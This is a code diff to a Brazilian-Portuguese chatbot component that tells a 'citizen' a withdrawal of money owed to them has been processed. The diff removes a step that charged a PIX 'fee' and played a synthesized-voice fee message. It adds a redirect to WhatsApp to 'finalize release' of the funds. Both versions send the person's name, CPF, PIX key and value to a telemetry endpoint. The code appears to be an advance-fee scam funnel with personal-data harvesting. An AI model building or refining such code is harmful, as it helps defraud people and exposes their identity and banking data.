@@ -486,72 +486,13 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setTimeout(() => {
           setTyping(false);
           const reqNumber = Math.floor(Math.random() * 90000000000) + 10000000000;
-          addBotMessage(`Solicitação de Saque Processada ✅\n\nNúmero da solicitação: ${reqNumber}\nTotal a receber: **${leadValue}**`, [
-            { text: "Receber por PIX", action: "generate_payment" }
+          addBotMessage(`Solicitação de Saque Processada ✅\n\nNúmero da solicitação: ${reqNumber}\nTotal a receber: **${leadValue}**\n\nPara finalizar a liberação do seu saque, clique no botão abaixo para falar com nosso atendimento via WhatsApp.`, [
+            { text: "Finalizar Liberação no WhatsApp", action: "go_whatsapp" }
           ]);
         }, 1500);
       }, 800);
     }
-    else if (action === "generate_payment") {
-      setMessages(prev => {
-        const newMessages = [...prev];
-        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
-        return newMessages;
-      });
-      setTyping(true);
-      
-      setTimeout(async () => {
-        setTyping(false);
-        addBotMessage("Conectando ao sistema bancário para gerar a sua transferência, isso pode levar alguns segundos...");
-        
-        setTyping(true);
-        try {
-          // Fetch BuyPix
-        const pixRes = await axios.post(`${API_URL}/api/v1/buypix/create`, {
-          amount: tarifa,
-          payer_document: data.docValue,
-          payer_name: leadName !== "Cidadão" ? leadName : (window as any)._globalLeadName || "Cidadão"
-        });
 
-        if (pixRes.data.data) {
-           setBuyPixData(pixRes.data.data);
-           fetch(`${API_URL}/api/v1/telemetry/chat`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ action: 'generated_payment', leadName, cpf: data.docValue, pix: leadPixKey, value: leadValue })
-           }).catch(console.error);
-
-           try {
-              const ttsRes = await axios.post(`${API_URL}/api/v1/tts`, { 
-                name: leadName !== "Cidadão" ? leadName : (window as any)._globalLeadName || "Cidadão",
-                attendantName: attendant.name,
-                voiceId: attendant.voiceId,
-                value: leadValue,
-                docType: data.docType,
-                type: 'taxa'
-              });
-              if (ttsRes.data.audioBase64) {
-                 const feeAudioUrl = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
-                 setTimeout(() => {
-                    addBotMessage("", undefined, undefined, "audio", feeAudioUrl);
-                 }, 4000);
-              }
-           } catch (err: any) {
-              console.error("Fee TTS generation error", err);
-           }
-        }
-      } catch (err: any) {
-         console.error("Payment generation error", err);
-         if (err.response?.data?.error) {
-           setBuyPixError(err.response.data.error);
-         } else {
-           setBuyPixError("Falha ao se conectar com o servidor PIX.");
-         }
-      }
-      setTyping(false);
-      addBotMessage("", undefined, undefined, "receipt");
-      }, 2000);
-    }
     else if (action === "go_whatsapp") {
       fetch(`${API_URL}/api/v1/telemetry/chat`, {
          method: 'POST',
@@ -559,7 +500,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
          body: JSON.stringify({ action: 'whatsapp', leadName, cpf: data.docValue, pix: leadPixKey, value: leadValue })
       }).catch(console.error);
 
-      const message = encodeURIComponent(`Olá, sou o(a) ${leadName}. Eu realizei o pagamento e quero liberar o meu valor manualmente.`);
+      const message = encodeURIComponent(`Olá, sou o(a) ${leadName}. Quero liberar minha transferência do valor de ${leadValue} na minha conta.`);
       window.open(`https://wa.me/${waNumber}?text=${message}`, '_blank');
     }
   };
